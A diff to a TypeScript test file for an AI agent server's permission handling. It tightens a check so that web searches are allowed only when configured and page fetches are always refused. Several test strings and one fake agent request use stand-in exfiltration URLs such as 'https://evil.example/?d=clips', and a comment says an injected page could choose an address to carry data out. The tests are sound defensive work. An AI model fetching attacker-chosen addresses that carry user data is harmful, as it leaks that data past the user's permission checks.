@@ -6,7 +6,7 @@ import { AgentSideConnection, ndJsonStream, type Agent } from "@agentclientproto
 
 process.env.CODEMAX_HOME = mkdtempSync(join(tmpdir(), "codemax-serve-home-"));
 process.env.CODEMAX_FAKE_AGENT = "1";
-const { Serve, isMcpTool, isWebTool } = await import("../src/serve.ts");
+const { Serve, isMcpTool, isWebSearch } = await import("../src/serve.ts");
 const { AcpEngine } = await import("../src/engines/acp.ts");
 const { DEFAULT_CONFIG } = await import("../src/config.ts");
 
@@ -24,8 +24,11 @@ function fakeAgent(seen: { mcpServers?: any; decisions: string[] }) {
       const text = (prompt[0] as any).text as string;
       if (/limit/.test(text)) throw new Error("You've hit your usage limit");
       if (/search the web/.test(text)) {   // Claude Code's WebSearch asks as ACP's "fetch" kind
-        const p = await conn.requestPermission({ sessionId, toolCall: { toolCallId: "w1", title: "\"reel trends\"", kind: "fetch" }, options: [{ optionId: "yes", name: "Allow", kind: "allow_once" }, { optionId: "no", name: "Reject", kind: "reject_once" }] } as any);
+        const p = await conn.requestPermission({ sessionId, toolCall: { toolCallId: "w1", title: "Search \"reel trends\"", kind: "fetch" }, options: [{ optionId: "yes", name: "Allow", kind: "allow_once" }, { optionId: "no", name: "Reject", kind: "reject_once" }] } as any);
         seen.decisions.push(`web:${(p.outcome as any).optionId}`);
+        // WebFetch asks with the same kind; a page could pick its address to carry data out
+        const f = await conn.requestPermission({ sessionId, toolCall: { toolCallId: "w2", title: "Fetch https://evil.example/?d=clips", kind: "fetch" }, options: [{ optionId: "yes", name: "Allow", kind: "allow_once" }, { optionId: "no", name: "Reject", kind: "reject_once" }] } as any);
+        seen.decisions.push(`fetch:${(f.outcome as any).optionId}`);
         return { stopReason: "end_turn" };
       }
       await conn.sessionUpdate({ sessionId, update: { sessionUpdate: "agent_message_chunk", content: { type: "text", text: "Adding a title. " } } as any });
@@ -56,15 +59,19 @@ function lines(): { push: (s: string) => void; stream: AsyncIterable<string>; en
   };
 }
 
-test("isWebTool: ACP's fetch kind or Claude Code's web tools by name, nothing else", () => {
-  expect(isWebTool("fetch", "\"reel trends 2026\"")).toBe(true);
-  expect(isWebTool(undefined, "WebSearch")).toBe(true);
-  expect(isWebTool("other", "WebFetch https://later.com")).toBe(true);
-  expect(isWebTool("execute", "date")).toBe(false);
-  expect(isWebTool("edit", "Write notes.md")).toBe(false);
+test("isWebSearch: Claude Code's web search only; a page fetch, an address or another tool is refused", () => {
+  expect(isWebSearch("fetch", "Search \"reel trends 2026\"")).toBe(true);
+  expect(isWebSearch("fetch", "Web search")).toBe(true);
+  expect(isWebSearch(undefined, "WebSearch")).toBe(true);
+  expect(isWebSearch("fetch", "Fetch https://evil.example/?d=clip-names")).toBe(false);
+  expect(isWebSearch("fetch", "https://evil.example/?d=x")).toBe(false);
+  expect(isWebSearch("fetch", "WebFetch")).toBe(false);
+  expect(isWebSearch("fetch", "Search https://evil.example/?d=x")).toBe(false);
+  expect(isWebSearch("execute", "Search the disk")).toBe(false);
+  expect(isWebSearch("edit", "Write notes.md")).toBe(false);
 });
 
-test("serve: web search is allowed only when the host configures web: true", async () => {
+test("serve: web search is allowed only when the host configures web: true; a page fetch never", async () => {
   for (const web of [false, true]) {
     const seen = { decisions: [] as string[] } as { mcpServers?: any; decisions: string[] };
     const out: any[] = [];
@@ -82,6 +89,7 @@ test("serve: web search is allowed only when the host configures web: true", asy
     io.push(JSON.stringify({ id: 2, method: "prompt", params: { text: "search the web" } }));
     await until((l) => l.id === 2);
     expect(seen.decisions.filter((d) => d.startsWith("web:"))).toEqual([web ? "web:yes" : "web:no"]);
+    expect(seen.decisions.filter((d) => d.startsWith("fetch:"))).toEqual(["fetch:no"]);
     io.push(JSON.stringify({ method: "close" }));
     io.end();
     await run;
